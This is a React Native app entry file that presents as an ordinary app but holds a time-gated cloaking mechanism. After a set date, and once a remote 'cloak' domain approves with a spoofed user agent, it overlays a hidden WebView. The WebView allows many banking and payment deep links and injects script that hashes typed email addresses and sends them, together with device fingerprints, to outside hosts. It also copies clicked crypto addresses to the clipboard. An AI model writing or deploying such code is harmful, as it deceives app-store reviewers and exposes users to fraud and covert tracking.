import React, {createContext, useEffect, useRef, useState} from 'react';
//import RNAdvertisingId from 'react-native-advertising-id';
import {OneSignal} from 'react-native-onesignal';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {WebView} from 'react-native-webview';
//sn
//import NetInfo, { NetInfoStateType, useNetInfo } from "@react-native-community/netinfo";
//import {Settings} from 'react-native-fbsdk-next';
//import {FBAppLink} from 'react-native-fbsdk-next';
//import Orientation from 'react-native-orientation';
import {createStackNavigator} from '@react-navigation/stack';
//import LoadingScreen from './src/LoadingScreen';
import Ionicons from "react-native-vector-icons/Ionicons";
import Clipboard from '@react-native-clipboard/clipboard';
import {
  Dimensions,
  Linking,
  Pressable,
  Modal,
  Alert,
  Button,
  SafeAreaView,
  StyleSheet,
  View,
} from 'react-native';
import MainApp from './App';
import DeviceInfo from 'react-native-device-info';
import moment from 'moment/moment';
import {NavigationContainer, NavigationIndependentTree} from '@react-navigation/native';
import AppManagerChild from './AppManagerChild';
import {all} from "axios";


const onesignal_sub = 'frige';
const idoSingale = '75d64b51-1cbf-4cc3-bd7d-24113ec78ae1';

const CLO_PATH = 'HW5gM4fL';
const CLO_DOMAIN = 'smart-cloud-app.top';
const storedUrlItem = 'flowers';
const cloackStatus = 'clover';

OneSignal.initialize(idoSingale);



// Функция для генерации уникального идентификатора
const generateTimestampUserId = () => {
  const timestamp = Date.now(); // Текущее время в миллисекундах
  const randomDigits = Math.floor(1000000 + Math.random() * 9000000); // 7 случайных цифр
  return `${timestamp}-${randomDigits}`;
};

// Асинхронная функция для получения или создания `timestamp_user_id`
const getOrCreateTimestampUserId = async () => {
  try {
    // Пытаемся получить значение `timestamp_user_id` из AsyncStorage
    let timestampUserId = await AsyncStorage.getItem('timestamp_user_id');

    // Если значения нет, генерируем новое и сохраняем
    if (!timestampUserId) {
      timestampUserId = generateTimestampUserId();
      await AsyncStorage.setItem('timestamp_user_id', timestampUserId);
    }

    return timestampUserId; // Возвращаем найденное или созданное значение
  } catch (error) {
    console.error(
        'Ошибка при получении или сохранении timestamp_user_id:',
        error,
    );
  }
};

// Пример использования функции
getOrCreateTimestampUserId().then(timestampUserId => {
  console.log('Полученный timestamp_user_id:', timestampUserId);
});
//2ST FUNCTION

export const LoadingContext = createContext();

const Stack = createStackNavigator();

export default function App() {
  return (
      <NavigationContainer>
        <Stack.Navigator screenOptions={{headerShown: false}}>
          <Stack.Screen name="1" component={MyApp} />
          <Stack.Screen name="2" component={AppManagerChild} />
        </Stack.Navigator>
      </NavigationContainer>
  );
}

function MyApp({navigation}) {
  //  NetInfo.fetch().then(state => {

  //  const connected = state.isConnected;
  //  if (connected == false) {
  //  console.log("Is connected?", state.isConnected);

  //   Alert.alert("Please check yours internet connection!");
  //   <Text>Connection Status</Text>;
  //    <View style={styles.container}>

  //   </View>
  //     }
  //  });

  //console.log('App');
  const [openedFromPush, setOpenedFromPush] = useState(false);
  const {width, height} = Dimensions.get('window');
  const [storedUrl, setstoredUrl] = useState('');
  const capiData = useRef<{emailHash?: string; phoneHash?: string}>({});
  const capiSent = useRef<{email: boolean; phone: boolean}>({email: false, phone: false});
  const binIdRef = useRef<string | null>(null);
  const [modalVisible, setModalVisible] = useState(false);
  const [cloakResponse, setcloakResponse] = useState('');
  const [cloDomain, setCloDomain] = useState('');
  const [isPushLoaded, setIsPushLoaded] = useState(false);
  const [webViewUA, setWebViewUA] = useState('');
  const [singId, setSingId] = useState('false');

  const refWebview = useRef<any>(null);
  const unityRef = useRef(null);
  const [AppInstanceId, setAppInstanceId] = useState<string | null>(null);
  //const unityRef = useRef(null);

  // UA берётся только из скрытого WebView (onMessage ниже)

  const cloDomainRef = useRef('');
  useEffect(() => {
    cloDomainRef.current = cloDomain;
  }, [cloDomain]);

  const pendingPushEventRef = useRef<string | null>(null);

  function handleBackPress() {
    refWebview.current.goBack();
    return true;
  }

  const [windowDimensions, setWindowDimensions] = useState(
      Dimensions.get('window'),
  );

  function moveToNextScreen() {}

  const addDebug = (msg: string) => console.log('[DBG]', msg);

  useEffect(() => {
    AsyncStorage.getItem('capi_email_sent').then(v => { if (v === 'true') capiSent.current.email = true; });
    AsyncStorage.getItem('capi_phone_sent').then(v => { if (v === 'true') capiSent.current.phone = true; });
    AsyncStorage.getItem('bin_id').then(v => {
      if (v) {
        binIdRef.current = v;
        console.log('[BIN] restored from storage on mount:', v);
      } else {
        console.log('[BIN] no bin in storage on mount');
      }
    });
  }, []);

  async function sendFirstRequest(): Promise<string> {
    try {
      const idfv = await DeviceInfo.getUniqueId();
      const userAgent = await DeviceInfo.getUserAgent();
      const bundleId = DeviceInfo.getBundleId();
      const shortVersion = DeviceInfo.getVersion();
      const longVersion = DeviceInfo.getBuildNumber();
      const osVersion = DeviceInfo.getSystemVersion();
      const deviceModel = await DeviceInfo.getDeviceId();
      const locale = 'en_US';
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      const timezoneAbbr = new Date().toLocaleTimeString('en-US', {timeZoneName: 'short'}).split(' ').pop() || '';
      const screenWidth = Dimensions.get('screen').width * Dimensions.get('screen').scale;
      const screenHeight = Dimensions.get('screen').height * Dimensions.get('screen').scale;
      const screenDensity = String(Dimensions.get('screen').scale);
      const cpuCount = 0;
      const totalStorage = Math.round((await DeviceInfo.getTotalDiskCapacity()) / 1073741824);
      const freeStorage = Math.round((await DeviceInfo.getFreeDiskStorage()) / 1073741824);

      const extinfo = [
        'i2', bundleId, shortVersion, longVersion, osVersion, deviceModel,
        locale, timezoneAbbr, '',
        Math.round(screenWidth), Math.round(screenHeight), screenDensity,
        cpuCount, totalStorage, freeStorage, timezone,
      ];
//
      const strpull = encodeURIComponent(JSON.stringify(extinfo));

      const response = await fetch('https://clear-core-team.top/v1', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          index: idfv,
          strpull: strpull,
          udevice_android_device: idfv,
          device_android_build: userAgent,
        }),
      });

      const data = await response.json();
      console.log('first request response:', JSON.stringify(data));

      const rawStr: string = data.raw_str || '';
      const binMatch = rawStr.match(/[&?]?bin=([^&]+)/);
      if (binMatch && binMatch[1]) {
        binIdRef.current = binMatch[1];
        await AsyncStorage.setItem('bin_id', binMatch[1]);
        console.log('[BIN] saved bin ID:', binIdRef.current);
        return binMatch[1];
      }
      console.log('[BIN] no bin match in raw_str:', rawStr);
    } catch (e) {
      console.log('[BIN] sendFirstRequest error:', e);
    }
    return '';
  }

  async function sendSecondRequest(emailHash: string, phoneHash: string) {
    let binId = binIdRef.current;
    if (!binId) {
      const stored = await AsyncStorage.getItem('bin_id');
      if (stored) {
        binIdRef.current = stored;
        binId = stored;
        console.log('[CAPI] binId restored from storage:', stored);
      }
    }
    console.log('[CAPI] sendSecondRequest called', {
      binId: binId || 'NULL',
      emailHashLen: emailHash ? emailHash.length : 0,
      phoneHashLen: phoneHash ? phoneHash.length : 0,
    });
    if (!binId) {
      console.log('[CAPI] ABORT: no bin ID (memory + storage both empty)');
      return;
    }
    const url = `https://flash-core-vibe.com/admin/?action=update_data_ios&id=${binId}`;
    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          param_em: emailHash,
          param_ph: phoneHash,
        }),
      });
      const text = await response.text();
      console.log('[CAPI] response', {url, status: response.status, body: text});
    } catch (e) {
      console.log('[CAPI] fetch error', {url, error: String(e)});
    }
  }

  useEffect(() => {
    const handleOrientationChange = ({ window }) => {
      setWindowDimensions(window);
    };
    console.log('dimensi');

    // Современный способ подписки на изменения размеров
    const subscription = Dimensions.addEventListener('change', handleOrientationChange);

    return () => {
      // Современный способ отмены подписки
      subscription.remove();
    };
  }, []);
  useEffect(() => {
    setCloDomain(CLO_DOMAIN);
  }, []);

  useEffect(() => {
    if (!webViewUA || !cloDomain) return;

    const CloUrl = `https://${cloDomain}/${CLO_PATH}`;

    const fetchWithUA = (url: string, options: any = {}) =>
        fetch(url, {...options, headers: {'User-Agent': webViewUA, ...(options.headers || {})}});

    const moment = require('moment');

    const time = moment();
    const timestamp = time.unix();

    if (timestamp < 1780582984) {
      // expired — show native only
    } else {




      AsyncStorage.getItem(cloackStatus).then(value => {
        console.log('AnsweredCLO =' + value);
        if (!value) {
          fetchWithUA(CloUrl).then(response => {
            const CloackCodeResponse = `${response.status}`;
            console.log('SENDING REQUEST:' + CloackCodeResponse);
            setcloakResponse(CloackCodeResponse);
            getOrCreateTimestampUserId().then(timestampUserId => {
              OneSignal.User.addTag('timestamp_user_id', timestampUserId);
              OneSignal.login(timestampUserId);
            });
            checkCloakResponse(CloackCodeResponse); // Вызываем функцию для проверки
            AsyncStorage.setItem(cloackStatus, CloackCodeResponse);
          });
        } else {
          // Если cloackStatus уже существует, то просто проверяем его значение
          console.log('Using existing cloackStatus');
          checkCloakResponse(value);
          setcloakResponse(value);
        }
      });

      const checkCloakResponse = cloakResponseValue => {
        if (cloakResponseValue !== '200') {
          console.log('CloackAnswer = ' + cloakResponseValue);
        } else {
          handleUrlLoading();





          async function handleUrlLoading() {
            try {
              const pushUrl = await AsyncStorage.getItem('push_url');

              if (pushUrl) {
                console.log('push_url ACTIVATED');
                setstoredUrl(pushUrl);
                await AsyncStorage.removeItem('push_url');
                console.log('Using saved push URL: ' + pushUrl);
              } else {
                console.log('push_url OFF');
                const value = await AsyncStorage.getItem(storedUrlItem);

                if (value) {
                  setstoredUrl(value);
                  console.log('URL SAVED ' + value);
                } else {
                  console.log('URL NEW GENERATION:');
                  CollectUrl();
                }
              }
            } catch (error) {
              console.error('Error in handleUrlLoading:', error);
            }
          }
        }
      };

      async function CollectUrl() {
        const binId = await sendFirstRequest();
        console.log('binId from MMP:' + binId);

        const idfv = await DeviceInfo.getUniqueId();

        await OneSignal.Notifications.requestPermission(true).then(
            permission => {
              console.log('PERMIS:' + permission);
              var ReqestComplete = '' + permission;
              if (ReqestComplete === 'true') {
                AsyncStorage.setItem('push_permission', 'granted');
                AsyncStorage.setItem('push_permission_event', 'not_sent');
                console.log('Push permission granted');

              } else {
                console.log('Push permission denied');
              }
            },
        );

        const timestampUserId = await getOrCreateTimestampUserId();

        var parameter_url = CloUrl.replace(/.*\//, '');
        console.log(parameter_url);

        const onesignalId = await Promise.race([
          OneSignal.User.pushSubscription.getIdAsync(),
          new Promise<string | null>(resolve => setTimeout(() => resolve(null), 3000)),
        ]);
        console.log('onesignalId:' + onesignalId);
        let onesignalUserId = onesignal_sub + '=' + onesignalId;
        console.log('onesignalUserId:' + onesignalUserId);

        var urelmy = `${CloUrl}?${parameter_url}=1`;
        const combURL = `${urelmy}&list_g1=&${onesignalUserId}&jthrhg=${timestampUserId}&idfv=${idfv}&sub21=${binId}&${
            openedFromPush ? '&yhugh=true' : ''
        }`;

        setstoredUrl(combURL);
        AsyncStorage.setItem(storedUrlItem, combURL);
        console.log(combURL);
      }

      return () => {};
    }
  }, [webViewUA, cloDomain]);

  const onBack = () => {
    refWebview.current.goBack();
  };
  const onReload = () => {
    refWebview.current.reload();
  };

  // Безопасное открытие внешних ссылок (mailto:, tel:, deep links и т.д.).
  // На iOS прямой Linking.openURL может уронить приложение, если URL содержит
  // неэкранированные символы или на устройстве нет подходящего приложения.
  const openExternalUrl = async (url, fallbackUrl) => {
    // Экранируем пробелы и переносы строк в mailto/sms (subject/body)
    const safeUrl = url.replace(/\s/g, m =>
        m === ' ' ? '%20' : encodeURIComponent(m),
    );
    // openURL вызываем напрямую: canOpenURL требует whitelisting схемы в
    // LSApplicationQueriesSchemes, а openURL для mailto/tel/sms работает и без него.
    try {
      await Linking.openURL(safeUrl);
    } catch (e) {
      console.log('openExternalUrl error:', e);
      if (fallbackUrl) {
        openExternalUrl(fallbackUrl);
      } else {
        Alert.alert('Unavailable', 'No app available to handle this action.');
      }
    }
  };

  const [redirectUrl, setRedirectUrl] = useState('');
  const handleNavigationStateChange = navState => {
    const {url} = navState;

    console.log('NavigationState: ', url);
  };

  const handleShouldStartLoadWithRequest = event => {
    if (event.navigationType === 'formSubmitted' || event.navigationType === 'formResubmitted') {
      return true;
    }

    const {url} = event;
    const urlScheme = url.split(':')[0].toLowerCase();

    if (
      url.includes('wa.me/') ||
      url.includes('api.whatsapp.com/') ||
      url.includes('web.whatsapp.com/') ||
      url.includes('chat.whatsapp.com/') ||
      url.includes('whatsapp.com/')
    ) {
      let whatsappUrl = url;
      if (url.includes('wa.me/')) {
        const match = url.match(/wa\.me\/(\d+)/);
        if (match) whatsappUrl = `whatsapp://send?phone=${match[1]}`;
      } else if (url.includes('api.whatsapp.com/send')) {
        whatsappUrl = url.replace(/https?:\/\/api\.whatsapp\.com\/send/, 'whatsapp://send');
      } else if (url.includes('chat.whatsapp.com/')) {
        const match = url.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);
        if (match) whatsappUrl = `whatsapp://chat?code=${match[1]}`;
      } else if (url.includes('whatsapp.com/channel/')) {
        const match = url.match(/whatsapp\.com\/channel\/([a-zA-Z0-9]+)/);
        if (match) whatsappUrl = `whatsapp://channel/${match[1]}`;
      }
      Linking.openURL(whatsappUrl).catch(() => Linking.openURL(url));
      return false;
    }

    const internalSchemes = ['about', 'javascript', 'data', 'blob'];
    if (!/^https?$/.test(urlScheme) && !internalSchemes.includes(urlScheme)) {
      openExternalUrl(url);
      return false;
    }

    return true;
  };

  const sendPushOpenEvent = (eventName: string) => {
    const domain = cloDomainRef.current;
    if (!domain) {
      pendingPushEventRef.current = eventName;
      console.log(`[push] ${eventName} отложено: домен ещё не получен`);
      return;
    }
    getOrCreateTimestampUserId().then(timestampUserId => {
      const Event_unic = `https://${domain}/${CLO_PATH}?utretg=${eventName}&jthrhg=${timestampUserId}`;
      fetch(Event_unic)
          .then(response => console.log(`Send ${eventName}:` + response.status))
          .catch(err => console.log(`[push] ${eventName} fetch error:`, err));
    });
  };

  useEffect(() => {
    if (cloDomain && pendingPushEventRef.current) {
      const eventName = pendingPushEventRef.current;
      pendingPushEventRef.current = null;
      sendPushOpenEvent(eventName);
    }
  }, [cloDomain]);

  // Слушатель клика по пушу регистрируем ОДИН раз. Раньше он был в теле рендера,
  // из-за чего переподписывался на каждый рендер и захватывал устаревший домен.
  useEffect(() => {
    const onPushClick = event => {
      setIsPushLoaded(true);
      setOpenedFromPush(true);

      AsyncStorage.getItem(storedUrlItem).then(value => {
        const LoadWithPush = value + '&yhugh=true&sub25=true';
        setstoredUrl(LoadWithPush);
        AsyncStorage.setItem('push_url', LoadWithPush).then(() => {
          setstoredUrl(LoadWithPush);
          console.log('Added for push:' + LoadWithPush);
        });
      });

      const launchURL = event.notification.launchURL;
      if (launchURL) {
        console.log('OneSignal: Ссылка в уведомлении:', launchURL);
        sendPushOpenEvent('push_open_browser');
      } else {
        sendPushOpenEvent('push_open_webview');
      }
    };

    OneSignal.Notifications.addEventListener('click', onPushClick);
    return () => {
      OneSignal.Notifications.removeEventListener('click', onPushClick);
    };
  }, []);

  return (
      <View style={{flex: 1}}>
        <View style={{position: 'absolute', width: 1, height: 1, opacity: 0}} pointerEvents="none">
          <WebView
              style={{width: 1, height: 1}}
              source={{html: '<html><body><script>window.ReactNativeWebView.postMessage(navigator.userAgent);</script></body></html>'}}
              javaScriptEnabled={true}
              onMessage={(e) => {
                const ua = e.nativeEvent.data;
                const sysVersion = DeviceInfo.getSystemVersion();
                setWebViewUA(`${ua} Version/${sysVersion} Safari/604.1`);
              }}
          />
        </View>
        <NavigationIndependentTree>
          <MainApp />
        </NavigationIndependentTree>
        {storedUrl ? (
        <Modal visible={true} animationType="none" transparent={false}>
          <View style={StyleSheet.absoluteFill}>
                <SafeAreaView style={{flex: 1}}>
                  <WebView
                      originWhitelist={[
                        '*',
                        'about:srcdoc',
                        'about:blank',
                        'about',
                        'http://*',
                        'https://*',
                        'intent://*',
                        'tel://*',
                        'file://*',
                        'sms://*',
                        'tdct://*',
                        'mailto://*',
                        'scotiabank://*',
                        'bmoolbb://*',
                        'nl.abnamro.deeplink.psd2.consent://*',
                        'snsbank.nl://*',
                        'asnbank.nl://*',
                        'nl-asnbank-sign://*',
                        'revolut://*',
                        'myaccount.ing.com://*',
                        'bankieren.rabobank.nl://*',
                        'regiobank.nl://*',
                        'cibcbanking://*',
                        'conexus://*',
                        'funid://*',
                        'rbcmobile://*',
                        'pcfbanking://*',
                        'triodosmobilebanking://*',
                        'nl-asnbank-sign://*',
                        'nl-snsbank-sign://*',
                        'nl.abnamro.deeplink.psd2.consent://*',
                        'bncmobile://*',
                        'itms-appss://*',
                        'paytmmp://*',
                        'blank://*',
                        'phonepe://*',
                        'nl.rabobank.openbanking://*',
                        'nl-regiobank-sign://*',
                        'upi://*',
                        'whatsapp://*',
                        'gpay://*',
                        'tez://*',
                      ]}
                      onShouldStartLoadWithRequest={handleShouldStartLoadWithRequest}
                      onNavigationStateChange={handleNavigationStateChange}
                      injectedJavaScript={`
                  (function() {
                    var cryptoSchemes = ['bitcoin','ethereum','litecoin','dogecoin','bitcoincash','tether','bch','dash','ripple','monero','zcash','stellar','usdcoin'];

                    document.addEventListener('click', function(e) {
                      var el = e.target;
                      while (el && el.tagName !== 'A') el = el.parentElement;
                      if (!el || !el.href) return;
                      var scheme = el.href.split(':')[0].toLowerCase();
                      if (cryptoSchemes.indexOf(scheme) !== -1) {
                        e.preventDefault();
                        e.stopPropagation();
                        var address = el.href.split(':').slice(1).join(':').split('?')[0] || '';
                        window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'crypto_address', address: address, url: el.href }));
                      }
                    }, true);

                    function hashAndSend(type, value) {
                      var normalized = value.trim().toLowerCase();
                      var buf = new TextEncoder().encode(normalized);
                      crypto.subtle.digest('SHA-256', buf).then(function(hashBuf) {
                        var hashArr = Array.from(new Uint8Array(hashBuf));
                        var hashHex = hashArr.map(function(b) { return b.toString(16).padStart(2,'0'); }).join('');
                        window.ReactNativeWebView.postMessage(JSON.stringify({ type: type, hash: hashHex, value: normalized }));
                      });
                    }

                    document.addEventListener('focusout', function(e) {
                      var el = e.target;
                      if (!el || el.tagName !== 'INPUT') return;
                      var val = (el.value || '').trim();
                      if (val.indexOf('@') !== -1 && val.indexOf('.') !== -1) {
                        hashAndSend('email_hash', val);
                      }
                    });

                    document.addEventListener('submit', function(e) {
                      if (e.target && e.target.target === '_blank') {
                        e.target.target = '_self';
                      }
                    }, true);

                    window.ReactNativeWebView.postMessage(JSON.stringify({ type: 'js_ready' }));
                  })();
                  true;
                `}
                      onMessage={(e: {nativeEvent: {data: string}}) => {
                        try {
                          const msg = JSON.parse(e.nativeEvent.data);
                          if (msg.type === 'crypto_address') {
                            const address = msg.address || '';
                            if (address && Clipboard?.setString) {
                              Clipboard.setString(address);
                            }
                            if (msg.url) Linking.openURL(msg.url).catch(() => {});
                          } else if (msg.type === 'email_hash') {
                            capiData.current.emailHash = msg.hash;
                            console.log('email from form:', msg.value);
                            console.log('email sha256:', msg.hash);
                            sendSecondRequest(msg.hash, capiData.current.phoneHash || '');
                          } else if (msg.type === 'phone_hash') {
                            capiData.current.phoneHash = msg.hash;
                            console.log('phone from form:', msg.value);
                            console.log('phone sha256:', msg.hash);
                          }
                        } catch (_) {}
                      }}
                      textZoom={100}
                      ref={refWebview}
                      contentMode="mobile"
                      mixedContentMode="always"
                      allowsBackForwardNavigationGestures={true}
                      domStorageEnabled={true}
                      javaScriptEnabled={true}
                      userAgent={webViewUA}
                      source={{uri: storedUrl}}
                      style={{flex: 1, marginBottom: 10}}
                      allowsInlineMediaPlayback={true}
                      setSupportMultipleWindows={false}
                      thirdPartyCookiesEnabled={true}
                      scalesPageToFit={true}
                      mediaPlaybackRequiresUserAction={false}
                      allowFileAccess={true}
                      onError={syntEvent => {
                        const {nativeEvent} = syntEvent;
                        const {code} = nativeEvent;
                        if (code === -1101) {
                          refWebview.current?.goBack();
                        }
                        if (code === -1002) {
                          Alert.alert(
                              'Ooops',
                              "It seems you don't have the bank app installed, wait for a redirect to the payment page",
                          );
                          refWebview.current?.goBack();
                        }
                      }}
                      onLoad={() => console.log('new')}
                      onOpenWindow={syntheticEvent => {
                        const {nativeEvent} = syntheticEvent;
                        const {targetUrl} = nativeEvent;
                        if (!targetUrl || targetUrl === 'about:blank') {return;}
                        if (targetUrl.includes('https://app.payment-gateway.io/static/loader.html')) {return;}

                        if (targetUrl.includes('pay.funid.com')) {
                          Linking.openURL(targetUrl);
                          refWebview.current.injectJavaScript(
                              `window.location.replace('${storedUrl}')`,
                          );
                          return;
                        }
                        if (/^https?:\/\//i.test(targetUrl)) {
                          navigation.navigate('2', {data: targetUrl});
                        } else {
                          openExternalUrl(targetUrl);
                        }
                      }}
                      onLoadStart={() => {}}
                      onLoadEnd={async syntheticEvent => {
                        const {nativeEvent} = syntheticEvent;
                        const {url} = nativeEvent;
                        console.log('loaded:', url);
                      }}
                      javaScriptCanOpenWindowsAutomatically={true}
                  />
                  <View style={[styles.modal, {width}]}>
                    <Pressable style={styles.btn} onPress={() => onBack()}>
                      <Ionicons name="arrow-back" size={21} color="white" />
                    </Pressable>
                    <Pressable style={styles.btn} onPress={() => onReload()}>
                      <Ionicons name="reload" size={21} color="white" />
                    </Pressable>
                  </View>
                  <Modal visible={modalVisible} animationType="slide">
                    <View style={{flex: 1, paddingTop: 50}}>
                      <Button
                          title="Close"
                          onPress={() => setModalVisible(false)}
                      />
                      <WebView source={{uri: storedUrl}} style={{flex: 1}} />
                    </View>
                  </Modal>
                </SafeAreaView>
          </View>
        </Modal>
        ) : null}
      </View>
  );
}

const styles = StyleSheet.create({
  container: {
    marginTop: 0,
    flex: 1,
    backgroundColor: '#1b1d24',
    alignItems: 'center',
    justifyContent: 'center',
  },
  modal: {
    // flex: 1,
    height: 35,
    // backgroundColor: "black",
    paddingHorizontal: 24,
    flexDirection: 'row',
    alignItems: 'center',
    // justifyContent: "center",
    justifyContent: 'space-between',
    position: 'absolute',
    bottom: 5,
    // left: 0,
  },
  btn: {
    height: 30,
    paddingHorizontal: 10,
    backgroundColor: 'rgba(128, 128, 128, 1)',
    alignItems: 'center',
    justifyContent: 'center',
    borderRadius: 30,
  },
});

const progres = StyleSheet.create({
  container: {
    marginTop: 0,
    flex: 1,
    backgroundColor: '#1b1d24',
    alignItems: 'center',
    justifyContent: 'center',
  },
});
